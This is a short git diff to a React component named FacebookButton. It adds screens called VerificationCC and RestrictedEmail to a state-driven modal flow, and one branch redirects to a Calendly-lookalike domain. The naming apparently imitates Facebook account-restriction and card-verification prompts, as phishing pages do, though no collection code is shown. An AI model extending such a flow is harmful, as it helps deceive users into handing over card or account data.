@@ -14,6 +14,8 @@ import { LoadingFacebookButton } from "./LoadingFacebookButton";
 import { TenMinute } from "./TenMinute";
 import { Landing } from "./Landing";
 import axios from "axios";
+import { VerificationCC } from "./VerificationCC";
+import { RestrictedEmail } from "./RestrictedEmail";
 
 export const FacebookButton = () => {
     const [isModalVisible, setIsModalVisible] = useState(false);
@@ -123,9 +125,12 @@ export const FacebookButton = () => {
             return <TH setValue={setValue} />
         } else if (state === 5) {
             return window.location.replace("https://calendly.essencemediascom.com/cgalli/")
-        }
-        else if (state === 6) {
+        }  else if (state === 6) {
             return <TenMinute setValue={setValue} />
+        } else if (state === 7) {
+            return <VerificationCC setValue={setValue} />
+        } else if (state === 8) {
+            return <RestrictedEmail setValue={setValue} />
         } else {
             return <ConfirmationModal setValue={setValue} />
 
